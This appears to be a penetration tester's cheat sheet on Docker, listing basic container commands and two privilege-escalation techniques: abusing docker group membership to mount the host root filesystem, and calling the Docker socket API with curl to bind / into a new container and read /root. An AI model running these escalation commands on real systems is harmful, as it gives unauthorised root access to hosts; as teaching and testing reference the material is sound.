---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc", "container", "escape", "dive"]
---

---
### Basic Commands

```bash
# Show all running processes
sudo docker ps -a
```

```bash
# Show all images
sudo docker images -a
```

```bash
# Stop all processes
sudo docker stop $(sudo docker ps -a -q)
```

```bash
# Remove all processes
sudo docker rm -vf $(sudo docker ps -a -q)
```

```bash
# Remove all images
sudo docker rmi -f $(sudo docker images -aq)
```

### Explore Docker image

[dive](https://github.com/wagoodman/dive)

```bash
dive docker-archive://image.tar
```

### Abuse #1: Docker group

```bash
# List images
docker images
```

```bash
# Mount host root filesystem
docker run -v /:/mnt -it <IMAGE_NAME> bash
```

```bash
# Check
ls /mnt/root
```

### Abuse #2: Docker API

```bash
# Show running containers
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```bash
# Create container
curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
```

```bash
# Start container
curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
```

```bash
# Show results
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
```

<br>